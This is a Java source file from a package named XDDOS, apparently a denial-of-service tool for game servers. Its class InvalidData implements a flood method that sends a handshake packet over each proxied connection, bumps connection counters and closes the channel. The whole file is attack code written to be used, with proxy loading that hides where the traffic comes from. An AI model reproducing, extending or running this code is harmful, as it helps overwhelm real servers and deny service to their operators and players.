package XD.XDDOS.methods.impl;

import XD.XDDOS.XDDOS;
import XD.XDDOS.methods.IMethod;
import XD.XDDOS.utils.NettyBootstrap;
import XD.XDDOS.utils.packet.Handshake;
import XD.XDDOS.utils.proxy.ProxyLoader;
import io.netty.channel.Channel;


public class InvalidData
  implements IMethod
{
  private Handshake handshake = new Handshake(XDDOS.protcolID, XDDOS.srvRecord, XDDOS.port, 2);


  public void accept(Channel channel, ProxyLoader.Proxy proxy) {
    channel.writeAndFlush(this.handshake);
    NettyBootstrap.integer++;
    NettyBootstrap.totalConnections++;
    channel.close();
  }
}
